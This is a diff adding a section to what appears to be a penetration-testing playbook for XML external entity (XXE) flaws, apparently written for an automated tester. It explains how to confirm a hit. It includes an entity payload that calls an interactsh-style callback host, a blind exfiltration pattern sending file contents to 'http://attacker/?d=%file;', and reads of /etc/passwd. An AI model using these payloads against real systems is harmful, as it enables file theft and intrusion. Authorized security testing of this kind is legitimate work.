@@ -31,6 +31,16 @@ nist_csf:
 - When evaluating SOAP-based web services for entity injection
 - During security assessments of enterprise applications using XML configuration
 
+## How to CONFIRM a Hit (avoid false negatives)
+
+A true-positive XXE needs the parser to actually resolve your entity — confirm with at least one concrete signal:
+- **In-band file read:** a response field reflects file content, e.g. `/etc/passwd` matching the regex `root:.*:0:0:`, or a base64 blob from `php://filter/convert.base64-encode/resource=...`.
+- **OOB entity callback:** a classic or parameter entity (`<!ENTITY % xxe SYSTEM "http://<id>.oast.fun/x">`) triggers an inbound **HTTP / DNS / FTP** hit on `interactsh`/Collaborator — proves resolution even with zero reflection.
+- **Blind OOB DTD exfiltration:** host an external DTD that reads a file and exfils it through a nested parameter entity to `http://attacker/?d=%file;` (use **FTP** for multi-line files like `/etc/passwd`).
+- **Error-based disclosure:** a forced parse error whose message embeds the target file contents.
+
+Do not conclude negative just because `&xxe;` is not reflected. You MUST exercise every variant before giving up: classic internal entities, **parameter entities** (`%`-prefixed, when direct entities are filtered), external-DTD OOB fetches, and entity injection inside uploaded XML formats (SVG, DOCX, XLSX). Parsers commonly block one vector while leaving another wide open.
+
 ## Prerequisites
 
 - **Authorization**: Written penetration testing agreement for the target
